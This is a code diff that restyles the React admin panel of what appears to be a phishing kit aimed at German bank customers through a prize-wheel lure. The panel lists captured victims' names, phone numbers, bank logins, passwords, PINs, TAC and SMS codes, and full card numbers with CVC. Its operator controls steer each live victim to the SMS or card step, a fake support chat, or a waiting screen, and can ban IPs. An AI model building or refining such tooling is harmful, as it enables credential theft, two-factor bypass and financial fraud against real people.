@@ -429,21 +429,39 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   }
 
   return (
-    <div className="space-y-6">
+    <div className="space-y-8 animate-in fade-in duration-500">
       <div className="flex items-center justify-between">
-        <h2 className={`text-lg font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Loglar ve Canlı Takip</h2>
+        <div className="flex items-center gap-3">
+          <div className={`p-2 rounded-xl ${darkMode ? 'bg-white/10 text-white' : 'bg-black/5 text-black'}`}>
+            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" /></svg>
+          </div>
+          <h2 className={`text-2xl font-bold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>Loglar ve Canlı Takip</h2>
+        </div>
         <button 
           onClick={() => {
             setSoundEnabled(!soundEnabled);
             if (!soundEnabled) playNotificationSound("Bildirim Testi", "Sesli bildirimler başarıyla açıldı.");
           }}
-          className={`flex items-center gap-2 rounded-full px-4 py-2 border text-[11px] font-bold tracking-wide uppercase transition-colors ${
+          className={`flex items-center gap-2.5 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${
             soundEnabled 
-              ? "bg-[#EB5E28]/10 border-[#EB5E28]/20 text-[#EB5E28]" 
-              : (darkMode ? "bg-zinc-800 border-zinc-700 text-zinc-500 hover:bg-zinc-700" : "bg-gray-100 border-gray-200 text-gray-500 hover:bg-gray-200")
+              ? "bg-[#EB5E28]/10 border border-[#EB5E28]/20 text-[#EB5E28] ring-1 ring-[#EB5E28]/50" 
+              : (darkMode ? "bg-[#1c1c1e] border border-white/10 text-zinc-400 hover:bg-white/10 hover:text-white" : "bg-white border border-gray-200 text-gray-500 hover:bg-gray-50 hover:text-black")
           }`}
         >
-          {soundEnabled ? "🔊 Ses Açık" : "🔇 Ses Kapalı"}
+          {soundEnabled ? (
+            <>
+              <span className="relative flex h-2.5 w-2.5">
+                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#EB5E28] opacity-75"></span>
+                <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-[#EB5E28]"></span>
+              </span>
+              Ses Açık
+            </>
+          ) : (
+            <>
+              <svg className="w-4 h-4 opacity-70" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2" /></svg>
+              Ses Kapalı
+            </>
+          )}
         </button>
       </div>
 
@@ -455,27 +473,27 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
       </div>
 
       {/* TABLE */}
-      <div className={`rounded-xl border shadow-sm overflow-hidden ${darkMode ? 'bg-[#1e1e1e] border-white/10' : 'bg-white border-gray-200'}`}>
+      <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
         <div className="overflow-x-auto">
-          <table className="w-full text-sm text-left">
-            <thead className={`text-xs uppercase border-b ${darkMode ? 'bg-[#2a2a2a] text-gray-400 border-white/10' : 'bg-gray-50 text-gray-600 border-gray-200'}`}>
+          <table className="w-full text-sm text-left border-collapse">
+            <thead className={`text-[11px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
               <tr>
-                <th className="px-4 py-4">ID</th>
-                <th className="px-4 py-4">Ödül</th>
-                <th className="px-4 py-4">İsim</th>
-                <th className="px-4 py-4">Numara</th>
-                <th className="px-4 py-4">Banka</th>
-                <th className="px-4 py-4">SMS</th>
-                <th className="px-4 py-4">Kart</th>
-                <th className="px-4 py-4">Sayfa</th>
-                <th className="px-4 py-4">Durum</th>
-                <th className="px-4 py-4">İşlemler</th>
+                <th className="px-5 py-4 font-semibold">ID</th>
+                <th className="px-5 py-4 font-semibold">Ödül</th>
+                <th className="px-5 py-4 font-semibold">İsim</th>
+                <th className="px-5 py-4 font-semibold">Numara</th>
+                <th className="px-5 py-4 font-semibold">Banka</th>
+                <th className="px-5 py-4 font-semibold">SMS</th>
+                <th className="px-5 py-4 font-semibold">Kart</th>
+                <th className="px-5 py-4 font-semibold">Sayfa</th>
+                <th className="px-5 py-4 font-semibold">Durum</th>
+                <th className="px-5 py-4 font-semibold text-right">İşlemler</th>
               </tr>
             </thead>
-            <tbody className="divide-y divide-white/5">
+            <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
               {rows.length === 0 && (
                 <tr>
-                  <td colSpan={10} className="px-4 py-8 text-center opacity-50">Henüz bir log yok</td>
+                  <td colSpan={10} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
                 </tr>
               )}
               {rows.map((row) => {
@@ -483,7 +501,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 const isOnline = onlineSessionIds.has(row.id);
                 
                 let stepText = "BAŞLANGIÇ";
-                let stepColor = "text-gray-400 bg-gray-500/10";
+                let stepColor = darkMode ? "text-gray-400 bg-gray-500/10 border border-gray-500/20" : "text-gray-600 bg-gray-100 border border-gray-200";
                 
                 let s = row.current_step as string;
                 const livePath = sessionPaths[row.id];
@@ -495,83 +513,83 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                   }
                 }
 
-                if (s === "wheel") { stepText = "ÇARK OYUNU"; stepColor = "text-teal-400 bg-teal-500/10"; }
+                if (s === "wheel") { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
                 else if (s === "code_entry") {
-                  if (fd.is_wheel_game) { stepText = "ÇARK OYUNU"; stepColor = "text-teal-400 bg-teal-500/10"; }
-                  else { stepText = "KOD GİRİŞİ"; stepColor = "text-pink-400 bg-pink-500/10"; }
+                  if (fd.is_wheel_game) { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
+                  else { stepText = "KOD GİRİŞİ"; stepColor = "text-pink-500 bg-pink-500/10 border border-pink-500/20"; }
                 }
-                else if (s === "win") { stepText = "İSİM & PROFİL"; stepColor = "text-blue-400 bg-blue-500/10"; }
-                else if (s === "banken") { stepText = "BANKA SEÇİMİ"; stepColor = "text-yellow-400 bg-yellow-500/10"; }
+                else if (s === "win") { stepText = "İSİM & PROFİL"; stepColor = "text-blue-500 bg-blue-500/10 border border-blue-500/20"; }
+                else if (s === "banken") { stepText = "BANKA SEÇİMİ"; stepColor = "text-yellow-600 dark:text-yellow-500 bg-yellow-500/10 border border-yellow-500/20"; }
                 else if (s === "bank") {
                   stepText = `BANKA GİRİŞİ ${fd.bankName ? `(${fd.bankName})` : ""}`;
-                  stepColor = "text-orange-400 bg-orange-500/10";
+                  stepColor = "text-orange-500 bg-orange-500/10 border border-orange-500/20";
                 }
-                else if (s === "sms") { stepText = "SMS ONAYI"; stepColor = "text-indigo-400 bg-indigo-500/10"; }
-                else if (s === "card") { stepText = "KREDİ KARTI"; stepColor = "text-purple-400 bg-purple-500/10"; }
-                else if (s === "wait") { stepText = "BEKLEMEDE"; stepColor = "text-gray-400 bg-gray-500/10"; }
-                else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-400 bg-green-500/10"; }
-                else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-400 bg-red-500/10"; }
-                else if (s === "live_support") { stepText = "CANLI DESTEK"; stepColor = "text-cyan-400 bg-cyan-500/10"; }
-                else if (s === "special_approval") { stepText = "ÖZEL BİLDİRİM"; stepColor = "text-fuchsia-400 bg-fuchsia-500/10"; }
+                else if (s === "sms") { stepText = "SMS ONAYI"; stepColor = "text-indigo-500 bg-indigo-500/10 border border-indigo-500/20"; }
+                else if (s === "card") { stepText = "KREDİ KARTI"; stepColor = "text-purple-500 bg-purple-500/10 border border-purple-500/20"; }
+                else if (s === "wait") { stepText = "BEKLEMEDE"; stepColor = "text-gray-500 bg-gray-500/10 border border-gray-500/20"; }
+                else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-500 bg-green-500/10 border border-green-500/20"; }
+                else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-500 bg-red-500/10 border border-red-500/20"; }
+                else if (s === "live_support") { stepText = "CANLI DESTEK"; stepColor = "text-cyan-500 bg-cyan-500/10 border border-cyan-500/20"; }
+                else if (s === "special_approval") { stepText = "ÖZEL BİLDİRİM"; stepColor = "text-fuchsia-500 bg-fuchsia-500/10 border border-fuchsia-500/20"; }
 
                 return (
-                  <tr key={row.id} className={`${darkMode ? 'hover:bg-white/5' : 'hover:bg-gray-50'} transition-colors`}>
-                    <td className="px-4 py-3 font-mono text-xs opacity-60" title={row.id}>{row.id.split('-')[0]}</td>
-                    <td className="px-4 py-3 font-semibold text-[#EB5E28]">
+                  <tr key={row.id} className={`${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-black/[0.01]'} transition-colors duration-200 group`}>
+                    <td className="px-5 py-4 font-mono text-[11px] opacity-50 uppercase" title={row.id}>{row.id.split('-')[0]}</td>
+                    <td className="px-5 py-4 font-bold text-lg text-[#EB5E28]">
                       {row.amount ? `€${row.amount}` : '-'}
                     </td>
-                    <td className="px-4 py-3">
-                      <div className="font-medium cursor-pointer hover:underline" onClick={() => copyToClipboard(`${fd.firstName || ''} ${fd.lastName || ''}`)}>
+                    <td className="px-5 py-4">
+                      <div className="font-semibold text-sm cursor-pointer hover:underline opacity-90 transition-opacity group-hover:opacity-100" onClick={() => copyToClipboard(`${fd.firstName || ''} ${fd.lastName || ''}`)}>
                         {fd.firstName || fd.lastName ? `${fd.firstName} ${fd.lastName}` : '-'}
                       </div>
                     </td>
-                    <td className="px-4 py-3">
-                      <div className="cursor-pointer hover:underline" onClick={() => copyToClipboard(fd.phone)}>
+                    <td className="px-5 py-4">
+                      <div className="cursor-pointer text-sm hover:underline opacity-80" onClick={() => copyToClipboard(fd.phone)}>
                         {fd.phone || '-'}
                       </div>
                     </td>
-                    <td className="px-4 py-3">
-                      <div className="text-xs space-y-1">
-                          {fd.bankName && <div className="font-bold text-yellow-500">{fd.bankName}</div>}
-                          {(fd.username || fd.verfuegernummer) && <div><span className="opacity-50">K:</span> <span className="cursor-pointer hover:text-white" onClick={()=>copyToClipboard((fd.username || fd.verfuegernummer) as string)}>{fd.username || fd.verfuegernummer}</span></div>}
-                          {(fd.password || fd.pin) && <div><span className="opacity-50">Ş:</span> <span className="cursor-pointer hover:text-white" onClick={()=>copyToClipboard((fd.password || fd.pin) as string)}>{fd.password || fd.pin}</span></div>}
-                          {fd.tacCode && <div><span className="opacity-50">TAC:</span> <span className="cursor-pointer hover:text-white" onClick={()=>copyToClipboard(fd.tacCode as string)}>{fd.tacCode}</span></div>}
+                    <td className="px-5 py-4">
+                      <div className="text-[13px] space-y-1.5">
+                          {fd.bankName && <div className="font-bold text-yellow-600 dark:text-yellow-500">{fd.bankName}</div>}
+                          {(fd.username || fd.verfuegernummer) && <div className="flex gap-1.5 items-center"><span className="opacity-40 text-[10px] font-bold uppercase bg-black/5 dark:bg-white/10 px-1.5 py-0.5 rounded">K.Adı</span> <span className="cursor-pointer font-medium hover:opacity-70 transition-opacity" onClick={()=>copyToClipboard((fd.username || fd.verfuegernummer) as string)}>{fd.username || fd.verfuegernummer}</span></div>}
+                          {(fd.password || fd.pin) && <div className="flex gap-1.5 items-center"><span className="opacity-40 text-[10px] font-bold uppercase bg-black/5 dark:bg-white/10 px-1.5 py-0.5 rounded">Şifre</span> <span className="cursor-pointer font-medium hover:opacity-70 transition-opacity" onClick={()=>copyToClipboard((fd.password || fd.pin) as string)}>{fd.password || fd.pin}</span></div>}
+                          {fd.tacCode && <div className="flex gap-1.5 items-center"><span className="opacity-40 text-[10px] font-bold uppercase bg-black/5 dark:bg-white/10 px-1.5 py-0.5 rounded">TAC</span> <span className="cursor-pointer font-medium hover:opacity-70 transition-opacity" onClick={()=>copyToClipboard(fd.tacCode as string)}>{fd.tacCode}</span></div>}
                         </div>
                     </td>
-                    <td className="px-4 py-3">
-                      <div className="cursor-pointer font-mono tracking-widest text-indigo-400 hover:underline" onClick={() => copyToClipboard(fd.smsCode)}>
+                    <td className="px-5 py-4">
+                      <div className="cursor-pointer font-mono tracking-widest text-indigo-500 font-bold text-base hover:underline drop-shadow-sm" onClick={() => copyToClipboard(fd.smsCode)}>
                         {fd.smsCode || '-'}
                       </div>
                     </td>
-                    <td className="px-4 py-3">
-                      <div className="text-xs space-y-1">
-                        {fd.cardNumber && <div><span className="opacity-50">No:</span> <span className="cursor-pointer hover:text-white" onClick={()=>copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</span></div>}
-                        {fd.cardExpiry && <div><span className="opacity-50">SKT:</span> {fd.cardExpiry}</div>}
-                        {fd.cardCvc && <div><span className="opacity-50">CVC:</span> {fd.cardCvc}</div>}
+                    <td className="px-5 py-4">
+                      <div className="text-[12px] space-y-1.5 font-medium">
+                        {fd.cardNumber && <div className="flex items-center gap-1.5"><span className="opacity-40 text-[10px] font-bold uppercase">No:</span> <span className="cursor-pointer hover:opacity-70" onClick={()=>copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</span></div>}
+                        {fd.cardExpiry && <div className="flex items-center gap-1.5"><span className="opacity-40 text-[10px] font-bold uppercase">SKT:</span> <span>{fd.cardExpiry}</span></div>}
+                        {fd.cardCvc && <div className="flex items-center gap-1.5"><span className="opacity-40 text-[10px] font-bold uppercase">CVC:</span> <span>{fd.cardCvc}</span></div>}
                       </div>
                     </td>
-                    <td className="px-4 py-3">
-                      <span className={`px-2 py-1 rounded text-[10px] font-bold ${stepColor}`}>
+                    <td className="px-5 py-4">
+                      <span className={`px-2.5 py-1 rounded-full text-[10px] font-bold tracking-wide shadow-sm ${stepColor}`}>
                         {stepText}
                       </span>
                     </td>
-                    <td className="px-4 py-3">
+                    <td className="px-5 py-4">
                       {isOnline ? (
-                        <span className="flex items-center text-green-400 text-xs font-bold">
-                          <span className="w-2 h-2 rounded-full bg-green-500 mr-2 animate-pulse"></span>
+                        <span className="inline-flex items-center gap-2 px-2.5 py-1 rounded-full bg-green-500/10 text-green-500 border border-green-500/20 text-[10px] font-bold tracking-widest">
+                          <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
                           ONLINE
                         </span>
                       ) : (
-                        <span className="flex items-center text-gray-500 text-xs font-bold">
-                          <span className="w-2 h-2 rounded-full bg-gray-500 mr-2"></span>
+                        <span className="inline-flex items-center gap-2 px-2.5 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[10px] font-bold tracking-widest">
+                          <span className="w-1.5 h-1.5 rounded-full bg-gray-500"></span>
                           OFFLINE
                         </span>
                       )}
                     </td>
-                    <td className="px-4 py-3">
-                      <div className="flex flex-col gap-2 min-w-[160px]">
+                    <td className="px-5 py-4">
+                      <div className="flex flex-col gap-2 min-w-[170px] items-end">
                         <select 
-                          className={`w-full rounded-md border text-xs px-2 py-2 outline-none cursor-pointer ${darkMode ? 'bg-[#1a1a1a] border-zinc-700 text-zinc-300 focus:border-[#EB5E28]' : 'bg-white border-gray-300 text-gray-700 focus:border-[#EB5E28]'}`}
+                          className={`w-full rounded-xl border text-xs px-3 py-2 outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
                           value="" 
                           onChange={(e) => {
                             if (e.target.value) {
@@ -580,29 +598,28 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                             }
                           }}
                         >
-                          <option value="">Bir işlem seç...</option>
-                          <option value="win">Giriş'e Yönlendir</option>
-                          <option value="banken">Banka Listesine Yönlendirme</option>
-                          <option value="sms">SMS'e Yönlendir</option>
-                          <option value="card">Kart'a Yönlendir</option>
-                          <option value="wait">Beklemeye Al</option>
-                          <option value="invalid_bank">Hatalı Banka</option>
-                          <option value="live_support">Canlı Desteğe Yönlendir</option>
-                          <option value="congrats">Tebrikler Ekranı</option>
-                          <option value="special_approval">Özel Bildirim Gönder</option>
-                          <option value="ban_ip">IP Banla (Siteye Giremesin)</option>
+                          <option value="">Aksiyon Seçin...</option>
+                          <option value="win">👉 İsim & Profil'e Yönlendir</option>
+                          <option value="banken">👉 Banka Listesine Yönlendir</option>
+                          <option value="sms">👉 SMS Doğrulamasına Yönlendir</option>
+                          <option value="card">👉 Kredi Kartına Yönlendir</option>
+                          <option value="wait">⏳ Beklemeye Al</option>
+                          <option value="invalid_bank">❌ Hatalı Banka (Uyarı)</option>
+                          <option value="live_support">🎧 Canlı Desteğe Yönlendir</option>
+                          <option value="congrats">✅ Tebrikler Ekranına Al</option>
+                          <option value="special_approval">🔔 Özel Bildirim Gönder</option>
+                          <option value="ban_ip">🚫 IP Banla (Siteye Giremesin)</option>
                         </select>
                         
-                        <div className="flex justify-end items-center mt-2 gap-2">
-                          <button onClick={() => setChatSessionId(row.id)} className="flex items-center gap-1 px-2 py-1 rounded bg-blue-500/10 text-blue-500 hover:bg-blue-500 hover:text-white transition-colors text-[10px] font-bold uppercase" title="Canlı Destek">
+                        <div className="flex justify-end items-center mt-1 gap-1.5">
+                          <button onClick={() => setChatSessionId(row.id)} className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 hover:bg-blue-500 hover:text-white transition-all duration-200 hover:scale-105 text-[10px] font-bold uppercase tracking-wide" title="Canlı Destek">
                             <span>💬 Destek</span>
                           </button>
-                          <button onClick={() => setDeviceInfoSession(row)} className="flex items-center gap-1 px-2 py-1 rounded bg-purple-500/10 text-purple-500 hover:bg-purple-500 hover:text-white transition-colors text-[10px] font-bold uppercase" title="Cihaz Bilgisi">
+                          <button onClick={() => setDeviceInfoSession(row)} className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 hover:bg-purple-500 hover:text-white transition-all duration-200 hover:scale-105 text-[10px] font-bold uppercase tracking-wide" title="Cihaz Bilgisi">
                             <span>📱 Cihaz</span>
                           </button>
-                          <button onClick={() => handleDelete(row.id)} className="flex items-center gap-1 px-2 py-1 rounded bg-red-500/10 text-red-500 hover:bg-red-500 hover:text-white transition-colors text-[10px] font-bold uppercase" title="Logu Sil">
-                            <span>Logu Gizle</span>
-                            <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
+                          <button onClick={() => handleDelete(row.id)} className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 hover:scale-105 text-[10px] font-bold uppercase tracking-wide" title="Logu Sil">
+                            <span>Gizle</span>
                           </button>
                         </div>
                       </div>
@@ -855,13 +872,14 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
 
 function StatCard({ icon, color, title, value, darkMode }: { icon: string, color: string, title: string, value: number, darkMode: boolean }) {
   return (
-    <div className={`p-6 rounded-xl border flex items-center shadow-sm ${darkMode ? 'bg-[#1e1e1e] border-white/10' : 'bg-white border-gray-200'}`}>
-      <div className={`w-14 h-14 shrink-0 flex items-center justify-center rounded-xl ${color.replace('text-', 'bg-').replace('500', '500/20')} ${color}`}>
-        <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d={icon} /></svg>
+    <div className={`relative overflow-hidden p-6 rounded-3xl border flex items-center transition-all duration-300 hover:scale-[1.02] hover:shadow-xl group ${darkMode ? 'bg-gradient-to-br from-[#1c1c1e]/80 to-[#1c1c1e]/40 border-white/5 shadow-lg backdrop-blur-xl' : 'bg-gradient-to-br from-white to-gray-50/80 border-[#d2d2d7]/50 shadow-md backdrop-blur-xl'}`}>
+      <div className={`absolute -right-6 -top-6 w-24 h-24 rounded-full blur-2xl opacity-20 transition-all duration-500 group-hover:scale-150 group-hover:opacity-40 ${color.replace('text-', 'bg-')}`}></div>
+      <div className={`w-14 h-14 shrink-0 flex items-center justify-center rounded-2xl shadow-sm ${color.replace('text-', 'bg-').replace('500', '500/10')} ${color}`}>
+        <svg className="w-7 h-7 drop-shadow-sm" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d={icon} /></svg>
       </div>
-      <div className="ml-4">
-        <div className={`text-sm font-medium ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>{title}</div>
-        <div className={`text-2xl font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>{value}</div>
+      <div className="ml-5 relative z-10">
+        <div className={`text-sm font-semibold tracking-wide uppercase opacity-70 mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>{title}</div>
+        <div className={`text-4xl font-bold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>{value}</div>
       </div>
     </div>
   );
